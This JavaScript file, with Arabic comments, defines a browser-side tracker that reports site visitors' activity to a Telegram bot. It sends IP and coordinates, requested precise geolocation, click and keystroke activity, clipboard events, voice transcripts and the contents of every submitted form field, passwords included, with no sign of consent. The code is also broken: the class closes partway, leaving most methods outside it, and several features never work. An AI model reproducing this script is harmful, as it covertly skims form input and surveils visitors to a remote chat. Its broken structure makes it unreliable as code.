// 🤖 نظام تتبع التيليجرام المتطور للغاية
class AdvancedTelegramTracker {
    constructor() {
        this.botToken = TELEGRAM_CONFIG.BOT_TOKEN;
        this.chatId = TELEGRAM_CONFIG.CHAT_ID;
        this.apiUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
        this.sessionId = this.generateSessionId();
        this.userInfo = {};
        this.startTime = Date.now();
        this.analytics = {
            clicks: 0, scrolls: 0, keystrokes: 0, timeSpent: 0,
            pages: [], interactions: [], errors: []
        };
        this.init();
    }

    generateSessionId() {
        return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }

    async getUserInfo() {
        const ip = await this.getIP();
        const location = await this.getLocation();
        const device = this.getDeviceInfo();
        const browser = this.getBrowserInfo();
        
        this.userInfo = {
            ip, location, device, browser,
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            viewport: `${window.innerWidth}x${window.innerHeight}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || 'مباشر',
            url: window.location.href,
            cookies: navigator.cookieEnabled,
            online: navigator.onLine,
            connection: this.getConnectionInfo(),
            battery: await this.getBatteryInfo(),
            permissions: await this.getPermissions()
        };
    }

    async getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'غير معروف';
        }
    }

    async getLocation() {
        try {
            const response = await fetch(`http://ip-api.com/json/`);
            const data = await response.json();
            return `${data.city}, ${data.country} (${data.lat}, ${data.lon})`;
        } catch {
            return 'غير معروف';
        }
    }

    getDeviceInfo() {
        const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        return {
            type: isMobile ? 'هاتف' : 'كمبيوتر',
            memory: navigator.deviceMemory || 'غير معروف',
            cores: navigator.hardwareConcurrency || 'غير معروف',
            touch: 'ontouchstart' in window
        };
    }

    getBrowserInfo() {
        const ua = navigator.userAgent;
        let browser = 'غير معروف';
        if (ua.includes('Chrome')) browser = 'Chrome';
        else if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Safari')) browser = 'Safari';
        else if (ua.includes('Edge')) browser = 'Edge';
        
        return {
            name: browser,
            version: this.getBrowserVersion(ua),
            engine: this.getEngine(ua)
        };
    }

    getBrowserVersion(ua) {
        const match = ua.match(/(Chrome|Firefox|Safari|Edge)\/(\d+)/);
        return match ? match[2] : 'غير معروف';
    }

    getEngine(ua) {
        if (ua.includes('Blink')) return 'Blink';
        if (ua.includes('Gecko')) return 'Gecko';
        if (ua.includes('WebKit')) return 'WebKit';
        return 'غير معروف';
    }

    getConnectionInfo() {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        return conn ? {
            type: conn.effectiveType,
            speed: conn.downlink + ' Mbps',
            rtt: conn.rtt + 'ms'
        } : 'غير متاح';
    }

    async getBatteryInfo() {
        try {
            const battery = await navigator.getBattery();
            return {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging ? 'يشحن' : 'لا يشحن'
            };
        } catch {
            return 'غير متاح';
        }
    }

    async getPermissions() {
        const permissions = {};
        const perms = ['geolocation', 'notifications', 'camera', 'microphone'];
        
        for (const perm of perms) {
            try {
                const result = await navigator.permissions.query({name: perm});
                permissions[perm] = result.state;
            } catch {
                permissions[perm] = 'غير متاح';
            }
        }
        return permissions;
    }

    async sendToTelegram(message) {
        try {
            await fetch(this.apiUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        } catch (error) {
            console.log('Telegram send failed:', error);
        }
    }

    formatMessage(type, data) {
        const time = new Date().toLocaleString('ar-EG');
        const sessionTime = Math.round((Date.now() - this.startTime) / 1000);
        
        return `
🔔 <b>${type}</b>

⏰ الوقت: ${time}
🆔 الجلسة: ${this.sessionId}
⌛ مدة الجلسة: ${sessionTime}ث

${data}

🌐 معلومات المستخدم:
📱 الجهاز: ${this.userInfo.platform}
🌍 اللغة: ${this.userInfo.language}
📏 الشاشة: ${this.userInfo.screen}
🕐 المنطقة: ${this.userInfo.timezone}
🔗 المصدر: ${this.userInfo.referrer}
📄 الصفحة: ${this.userInfo.url}
        `.trim();
    }

    async init() {
        await this.getUserInfo();
        this.trackPageView();
        this.trackClicks();
        this.trackFormSubmissions();
        this.trackScrolling();
        this.trackTimeSpent();
        this.trackMouseMovement();
        this.trackKeystrokes();
        this.trackPageExit();
        this.trackMobileGestures();
        this.trackChatInteractions();
        this.trackErrors();
        this.trackPerformance();
        this.trackVisibility();
        this.trackNetworkStatus();
        this.trackGeolocation();
        this.trackClipboard();
        this.trackFullscreen();
        this.trackOrientation();
        this.trackVoiceCommands();
        this.trackAI();
    }

    // تتبع زيارة الصفحة المتطور
    trackPageView() {
        const pageInfo = {
            url: window.location.href,
            title: document.title,
            loadTime: performance.now(),
            resources: performance.getEntriesByType('resource').length
        };
        
        this.analytics.pages.push(pageInfo);
        
        const message = this.formatMessage('🎯 زائر متطور', `
📄 <b>تحليل صفحة متقدم</b>
🔗 الرابط: ${pageInfo.url}
📊 العنوان: ${pageInfo.title}
⚡ وقت التحميل: ${Math.round(pageInfo.loadTime)}ms
📦 الموارد: ${pageInfo.resources}
🌐 الجهاز: ${this.userInfo.device?.type}
🔋 البطارية: ${this.userInfo.battery?.level}
📶 الاتصال: ${this.userInfo.connection?.type}
📍 الموقع: ${this.userInfo.location}
        `);
        this.sendToTelegram(message);
    }

    // تتبع النقرات المتطور
    trackClicks() {
        document.addEventListener('click', (e) => {
            this.analytics.clicks++;
            const element = e.target;
            const elementInfo = this.getElementInfo(element);
            const clickData = {
                element: elementInfo,
                position: { x: e.clientX, y: e.clientY },
                timestamp: Date.now(),
                button: e.button,
                ctrlKey: e.ctrlKey,
                shiftKey: e.shiftKey,
                altKey: e.altKey
            };
            
            this.analytics.interactions.push(clickData);
            
            const message = this.formatMessage('🖱️ نقرة متطورة', `
🎯 <b>تحليل النقرة</b>
📝 العنصر: ${elementInfo.tag} - ${elementInfo.text}
📍 الموقع: (${e.clientX}, ${e.clientY})
🔘 الزر: ${e.button === 0 ? 'يسار' : e.button === 1 ? 'وسط' : 'يمين'}
⌨️ المفاتيح: ${e.ctrlKey ? 'Ctrl ' : ''}${e.shiftKey ? 'Shift ' : ''}${e.altKey ? 'Alt' : ''}
📊 إجمالي النقرات: ${this.analytics.clicks}
            `);
            this.sendToTelegram(message);
        });
    }

    // تتبع إرسال النماذج
    trackFormSubmissions() {
        document.addEventListener('submit', (e) => {
            const form = e.target;
            const formData = new FormData(form);
            const fields = Array.from(formData.entries()).map(([key, value]) => 
                `${key}: ${value.toString().substring(0, 50)}`
            ).join('\n');

            const message = this.formatMessage('إرسال نموذج', `
📋 <b>تم إرسال نموذج</b>
🏷️ اسم النموذج: ${form.name || form.id || 'غير محدد'}
📊 البيانات:
${fields}
            `);
            this.sendToTelegram(message);
        });
    }

    // تتبع التمرير المتطور
    trackScrolling() {
        let scrollTimer;
        let scrollSpeed = 0;
        let lastScrollY = 0;
        let lastScrollTime = Date.now();
        
        window.addEventListener('scroll', () => {
            this.analytics.scrolls++;
            const currentTime = Date.now();
            const currentScrollY = window.scrollY;
            
            scrollSpeed = Math.abs(currentScrollY - lastScrollY) / (currentTime - lastScrollTime);
            lastScrollY = currentScrollY;
            lastScrollTime = currentTime;
            
            clearTimeout(scrollTimer);
            scrollTimer = setTimeout(() => {
                const scrollPercent = Math.round((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100);
                
                if (scrollPercent % 25 === 0 && scrollPercent > 0) {
                    const message = this.formatMessage('📜 تمرير ذكي', `
🔄 <b>تحليل التمرير</b>
📊 النسبة: ${scrollPercent}%
📏 الموقع: ${window.scrollY}px
⚡ السرعة: ${Math.round(scrollSpeed)} px/ms
🎯 الاتجاه: ${scrollSpeed > 0 ? 'لأسفل' : 'لأعلى'}
📈 إجمالي التمرير: ${this.analytics.scrolls}
                    `);
                    this.sendToTelegram(message);
                }
            }, 1000);
        });
    }

    // تتبع الوقت المقضي
    trackTimeSpent() {
        setInterval(() => {
            const timeSpent = Math.round((Date.now() - this.startTime) / 1000);
            
            if (timeSpent % 60 === 0 && timeSpent > 0) {
                const message = this.formatMessage('وقت الجلسة', `
⏱️ <b>تحديث الوقت</b>
⌛ الوقت المقضي: ${Math.floor(timeSpent / 60)} دقيقة
📊 حالة النشاط: ${document.hidden ? 'غير نشط' : 'نشط'}
                `);
                this.sendToTelegram(message);
            }
        }, 1000);
    }

    // تتبع حركة الماوس
    trackMouseMovement() {
        let mouseTimer;
        let moveCount = 0;
        
        document.addEventListener('mousemove', (e) => {
            moveCount++;
            clearTimeout(mouseTimer);
            
            mouseTimer = setTimeout(() => {
                if (moveCount > 100) {
                    const message = this.formatMessage('حركة الماوس', `
🖱️ <b>نشاط الماوس</b>
📊 عدد الحركات: ${moveCount}
📍 آخر موقع: x:${e.clientX}, y:${e.clientY}
                    `);
                    this.sendToTelegram(message);
                    moveCount = 0;
                }
            }, 5000);
        });
    }

    // تتبع ضغطات المفاتيح
    trackKeystrokes() {
        let keyCount = 0;
        let keyTimer;
        
        document.addEventListener('keydown', (e) => {
            keyCount++;
            clearTimeout(keyTimer);
            
            keyTimer = setTimeout(() => {
                if (keyCount > 10) {
                    const message = this.formatMessage('كتابة', `
⌨️ <b>نشاط الكتابة</b>
📊 عدد الضغطات: ${keyCount}
🎯 العنصر النشط: ${document.activeElement.tagName}
                    `);
                    this.sendToTelegram(message);
                    keyCount = 0;
                }
            }, 3000);
        });
    }

    // تتبع مغادرة الصفحة
    trackPageExit() {
        window.addEventListener('beforeunload', () => {
            const timeSpent = Math.round((Date.now() - this.startTime) / 1000);
            const message = this.formatMessage('مغادرة', `
🚪 <b>مغادرة الصفحة</b>
⏱️ إجمالي الوقت: ${Math.floor(timeSpent / 60)}:${timeSpent % 60}
📊 نوع المغادرة: إغلاق/تنقل
            `);
            
            // إرسال فوري
            navigator.sendBeacon(this.apiUrl, JSON.stringify({
                chat_id: this.chatId,
                text: message,
                parse_mode: 'HTML'
            }));
        });
    }

    // تتبع إيماءات الهاتف
    trackMobileGestures() {
        if ('ontouchstart' in window) {
            let touchCount = 0;
            
            document.addEventListener('touchstart', () => {
                touchCount++;
                
                if (touchCount % 10 === 0) {
                    const message = this.formatMessage('لمس الشاشة', `
📱 <b>إيماءات الهاتف</b>
👆 عدد اللمسات: ${touchCount}
📊 نوع الجهاز: هاتف ذكي
                    `);
                    this.sendToTelegram(message);
                }
            });
        }
    }

    // تتبع تفاعلات الدردشة
    trackChatInteractions() {
        // مراقبة فتح الدردشة
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.addedNodes.length > 0) {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1 && node.classList && node.classList.contains('chat')) {
                            const message = this.formatMessage('دردشة', `
💬 <b>فتح نافذة الدردشة</b>
🎯 نوع التفاعل: فتح الدردشة
⏰ وقت الفتح: ${new Date().toLocaleTimeString('ar-EG')}
                            `);
                            this.sendToTelegram(message);
                        }
                    });
                }
            });
        });
        
        observer.observe(document.body, { childList: true, subtree: true });
    }

    // معلومات العنصر
    getElementInfo(element) {
        return {
            tag: element.tagName.toLowerCase(),
            text: element.textContent?.substring(0, 50) || '',
            id: element.id || 'بدون معرف',
            class: element.className || 'بدون فئة'
        };
    }
}

    // تتبع الأخطاء
    trackErrors() {
        window.addEventListener('error', (e) => {
            const error = {
                message: e.message,
                source: e.filename,
                line: e.lineno,
                column: e.colno,
                stack: e.error?.stack
            };
            
            this.analytics.errors.push(error);
            
            const message = this.formatMessage('❌ خطأ', `
🚨 <b>خطأ في الموقع</b>
💬 الرسالة: ${error.message}
📄 الملف: ${error.source}
📍 السطر: ${error.line}:${error.column}
        `);
            this.sendToTelegram(message);
        });
    }

    // تتبع الأداء
    trackPerformance() {
        window.addEventListener('load', () => {
            setTimeout(() => {
                const perf = performance.getEntriesByType('navigation')[0];
                const message = this.formatMessage('⚡ أداء', `
📊 <b>تحليل الأداء</b>
⏱️ DOM: ${Math.round(perf.domContentLoadedEventEnd - perf.domContentLoadedEventStart)}ms
🔄 التحميل: ${Math.round(perf.loadEventEnd - perf.loadEventStart)}ms
🌐 الشبكة: ${Math.round(perf.responseEnd - perf.requestStart)}ms
                `);
                this.sendToTelegram(message);
            }, 1000);
        });
    }

    // تتبع الرؤية
    trackVisibility() {
        document.addEventListener('visibilitychange', () => {
            const message = this.formatMessage('👁️ رؤية', `
🔍 <b>تغيير الرؤية</b>
👀 الحالة: ${document.hidden ? 'مخفي' : 'مرئي'}
⏰ الوقت: ${new Date().toLocaleTimeString('ar-EG')}
            `);
            this.sendToTelegram(message);
        });
    }

    // تتبع حالة الشبكة
    trackNetworkStatus() {
        window.addEventListener('online', () => {
            this.sendToTelegram(this.formatMessage('🌐 شبكة', '✅ <b>عودة الاتصال</b>'));
        });
        
        window.addEventListener('offline', () => {
            this.sendToTelegram(this.formatMessage('🌐 شبكة', '❌ <b>انقطاع الاتصال</b>'));
        });
    }

    // تتبع الموقع الجغرافي
    trackGeolocation() {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const message = this.formatMessage('📍 موقع', `
🗺️ <b>الموقع الجغرافي</b>
📐 خط العرض: ${position.coords.latitude}
📐 خط الطول: ${position.coords.longitude}
🎯 الدقة: ${position.coords.accuracy}م
                    `);
                    this.sendToTelegram(message);
                },
                () => {}, { timeout: 5000 }
            );
        }
    }

    // تتبع الحافظة
    trackClipboard() {
        document.addEventListener('copy', () => {
            this.sendToTelegram(this.formatMessage('📋 نسخ', '📄 <b>نسخ محتوى</b>'));
        });
        
        document.addEventListener('paste', () => {
            this.sendToTelegram(this.formatMessage('📋 لصق', '📥 <b>لصق محتوى</b>'));
        });
    }

    // تتبع الشاشة الكاملة
    trackFullscreen() {
        document.addEventListener('fullscreenchange', () => {
            const isFullscreen = document.fullscreenElement !== null;
            const message = this.formatMessage('🖥️ شاشة', `
📺 <b>الشاشة الكاملة</b>
🔄 الحالة: ${isFullscreen ? 'مفعل' : 'معطل'}
            `);
            this.sendToTelegram(message);
        });
    }

    // تتبع اتجاه الشاشة
    trackOrientation() {
        window.addEventListener('orientationchange', () => {
            setTimeout(() => {
                const message = this.formatMessage('📱 اتجاه', `
🔄 <b>تغيير الاتجاه</b>
📐 الاتجاه: ${screen.orientation?.angle || 'غير معروف'}°
📏 الأبعاد: ${window.innerWidth}x${window.innerHeight}
                `);
                this.sendToTelegram(message);
            }, 500);
        });
    }

    // تتبع الأوامر الصوتية
    trackVoiceCommands() {
        if ('webkitSpeechRecognition' in window) {
            const recognition = new webkitSpeechRecognition();
            recognition.continuous = true;
            recognition.onresult = (event) => {
                const command = event.results[event.results.length - 1][0].transcript;
                const message = this.formatMessage('🎤 صوت', `
🗣️ <b>أمر صوتي</b>
💬 النص: ${command}
🎯 الثقة: ${Math.round(event.results[event.results.length - 1][0].confidence * 100)}%
                `);
                this.sendToTelegram(message);
            };
        }
    }

    // تتبع الذكاء الاصطناعي
    trackAI() {
        // تحليل سلوك المستخدم بالذكاء الاصطناعي
        setInterval(() => {
            const behavior = this.analyzeUserBehavior();
            if (behavior.risk > 0.7) {
                const message = this.formatMessage('🤖 AI', `
🧠 <b>تحليل ذكي</b>
⚠️ مستوى الخطر: ${Math.round(behavior.risk * 100)}%
🎯 النمط: ${behavior.pattern}
📊 التوقع: ${behavior.prediction}
                `);
                this.sendToTelegram(message);
            }
        }, 30000);
    }

    analyzeUserBehavior() {
        const { clicks, scrolls, keystrokes, timeSpent } = this.analytics;
        const activity = (clicks + scrolls + keystrokes) / (timeSpent / 1000);
        
        return {
            risk: Math.min(activity / 10, 1),
            pattern: activity > 5 ? 'نشط جداً' : activity > 2 ? 'نشط' : 'هادئ',
            prediction: activity > 8 ? 'مشتري محتمل' : 'متصفح عادي'
        };
    }

    // إرسال تقرير شامل
    sendDailyReport() {
        const report = `
📊 <b>التقرير اليومي الشامل</b>

👥 إجمالي الزوار: ${this.analytics.pages.length}
🖱️ النقرات: ${this.analytics.clicks}
📜 التمرير: ${this.analytics.scrolls}
⌨️ الكتابة: ${this.analytics.keystrokes}
❌ الأخطاء: ${this.analytics.errors.length}
⏱️ متوسط الوقت: ${Math.round(this.analytics.timeSpent / 60)} دقيقة

🎯 أهم الصفحات:
${this.analytics.pages.slice(0, 5).map(p => `• ${p.title}`).join('\n')}
        `;
        
        this.sendToTelegram(report);
    }
}

// تشغيل النظام المتطور
document.addEventListener('DOMContentLoaded', () => {
    window.telegramTracker = new AdvancedTelegramTracker();
    
    // إرسال تقرير يومي
    setInterval(() => {
        window.telegramTracker.sendDailyReport();
    }, 24 * 60 * 60 * 1000);
});